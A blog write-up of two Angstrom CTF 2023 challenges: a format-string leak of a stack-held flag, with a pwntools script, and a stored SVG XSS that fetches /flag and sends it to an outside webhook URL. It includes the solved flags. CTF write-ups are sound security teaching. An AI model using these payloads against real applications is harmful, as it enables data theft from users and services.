---
title: Angstrom CTF 2023
slug: AngstromCTF-2023
author: [kane]
date: 2023-06-21
tags: [ctf,writeup]
---

## Queue

Category: pwn

Requires: format string bug

(wasn't solved during event, this is just my proecdure after reading a few writeups)

ghidra, decompile `main`, reverse some variables:
```c
void main(void)

{
  __gid_t __rgid;
  FILE *__stream;
  long in_FS_OFFSET;
  char input [48];
  char flag [136];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  __rgid = getegid();
  setresgid(__rgid,__rgid,__rgid);
  __stream = fopen("flag.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("Error: missing flag.txt.");
                    // WARNING: Subroutine does not return
    exit(1);
  }
  fgets(flag,128,__stream);
  printf("What did you learn in class today? ");
  fgets(input,48,stdin);
  printf("Oh nice, ");
  printf(input);
  printf("sounds pretty cool!");
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
}
```

since there is `fgets()` followed by `printf()` it is a FSB (Format string bug)

`%n$p` gets the nth argument on the stack as a **pointer**. (Wait, why is the flag encoded in the memory address? idk, did they forget to reference the value or smth???)

so we input this:
```
What did you learn in class today? %1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p %11$p %12$p %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p
Oh nice, 0x7ffd8d06e960 (nil) (nil) (nil) (nil) 0x3e800000002 0x55d9978532a0 0x2432252070243125 0x2520702433252070 %1sounds pretty cool!
```
We get `0x2432252070243125 0x2520702433252070` as the "output". Converting this to little endian ascii:
```python
list = [0x2432252070243125, 0x2520702433252070]

flag = []

for l in list:
    l = hex(l)
    bytelen = len(l)-2
    if bytelen%2==1:
        l = '0'+l
    for i in range(1,bytelen,2):
        f = l[-i-1]+l[-i]
        f = int(f,16)
        flag.append(chr(f))
print(''.join(flag))
```

we get `%1$p %2$p %3$p %`, which is the original input (shouldn't be surprising, the `input` also stored on the stack). 
We keep removing format strings to prevent clogging the output until we get:
```
What did you learn in class today? %13$p %14$p %15$p %16$p %17$p %18$p %19$p %20$p
Oh nice, 0x70243032252070 0x3474737b66746361 0x75715f74695f6b63 0x615f74695f657565 0x3437396461393136 0x7d32326234363863 (nil) (nil)sounds pretty cool!
```
which becomes `p %20$pactf{st4ck_it_queue_it_a619ad974c864b22}`
Flag:
```
actf{st4ck_it_queue_it_a619ad974c864b22}`
```

Better script: [source](https://www.youtube.com/watch?v=jqF4Sgi4Ars)
```python
import pwn
import time
import warnings

elf = pwn.ELF('./queue')
pwn.context.binary = elf
pwn.context.log_level = "DEBUG"

libc = elf.libc

out=""
for i in range(14,19):
	# p = elf.process()
	p = pwn.remote('challs.actf.co','31322')
	p.sendlineafter(b"today?", f"%{i}$p")
	
	p.recvuntil('Oh nice, 0x')
	
	data = p.recvuntil('sounds', drop=True)
	out+=bytes.fromhex(data.decode()).decode()[::-1]
	p.close()
print(out)
```

## Hallmark
Category: Web

Requires: xss, javascript knowledge (and some svg knowledge ig)

(wasn't solved during event, this is just my proecdure after reading a few writeups)

Looking through the source code of the server, it does not seem that we are able to directly xss it from just the `POST /flag` 
However there is the `PUT /flag` route for the challenge that allows us to potentially edit a card's content:
```js
app.put('/card', (req, res) => {
    let { id, type, svg, content } = req.body;

    if (!id || !cards[id]) {
        res.send('bad id');
        return;
    }

    cards[id].type = type == 'image/svg+xml' ? type : 'text/plain';
    cards[id].content = type === 'image/svg+xml' ? IMAGES[svg || 'heart'] : content;

    res.send('ok');

});
```
We also see that we can pass rich objects and arrays into the request since `extended: true`:
```js
app.use(bodyParser.urlencoded({ extended: true }));
```
We want the type to be `image/svg+xml` so that it renders as an svg allowing it to run the `<script></script>` in the svg, but we want to input our own svg. We simply set the `type` to be `["image/svg+xml"]` since:
```js
> ['a'] == 'a'
True
> ['a'] === 'a'
False
```
so we first create a pre-existing card, then we send the following request on https://hoppscotch.io:
Request Body:
| Parameter | Value                                                                                                                                                                                                                              |
| --------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `id`        | `[your id]`                                                                                                                                                                                                                          |
| `type[]`  | `image/svg+xml` - inputs an array into the server                                                                                                                                                                                                                  |
| `content`   | `<svg version="1.1" width="300" height="200" xmlns="http://www.w3.org/2000/svg"><script>fetch('/flag').then(r=>r.text()).then(d=>window.location="https://webhook.site/63b5be4d-5111-467d-8572-18702c2e7b00?c="+d)</script></svg>` |

its simply an svg:
```xml
<svg version="1.1" width="300" height="200" xmlns="http://www.w3.org/2000/svg"><script></script></svg>
```
with a fetch
```js
fetch('/flag').then(r=>r.text()).then(d=>window.location="https://webhook.site/blahblah?c="+d)
```
now we submit this to the admin site and in our webhook we see:
`actf{the_adm1n_has_rece1ved_y0ur_card_cefd0aac23a38d33}`
